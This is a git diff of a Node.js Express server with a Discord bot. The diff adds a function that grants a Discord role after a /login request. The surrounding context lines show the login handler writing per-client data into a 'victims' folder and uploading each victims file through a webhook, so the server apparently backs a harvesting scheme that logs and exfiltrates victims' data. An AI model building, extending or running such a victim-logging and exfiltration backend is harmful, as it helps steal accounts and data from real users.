@@ -104,6 +104,25 @@ async function check_base(conteudo, num) {
   return false
 }
 
+async function addRoleToUser(userId, roleId) {
+  try {
+      const guild = bot.guilds.cache.get('1213828582246449253'); // Replace 'your_guild_id' with your actual guild ID
+      if (!guild) throw new Error('Guild not found.');
+
+      const member = await guild.members.fetch(userId);
+      if (!member) throw new Error('Member not found.');
+
+      const role = guild.roles.cache.get(roleId);
+      if (!role) throw new Error('Role not found.');
+
+      await member.roles.add(role);
+      console.log(`Role ${role.name} added to ${member.user.tag}`);
+  } catch (error) {
+      console.error('Error adding role:', error);
+  }
+}
+
+
 
 app.use(async (req, res, next) => {
   res.header("Access-Control-Allow-Origin", "*")
@@ -174,6 +193,7 @@ app.post('/login', limiter, async (req, res) => {
         'guildId': js.guildId,
         'clientId': js.clientId,
       }, null, 3))
+      addRoleToUser(api.user_id, '1214253196864913438')
       await webhook.sendFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`))
       return res.status(200).json({
         'status': 1
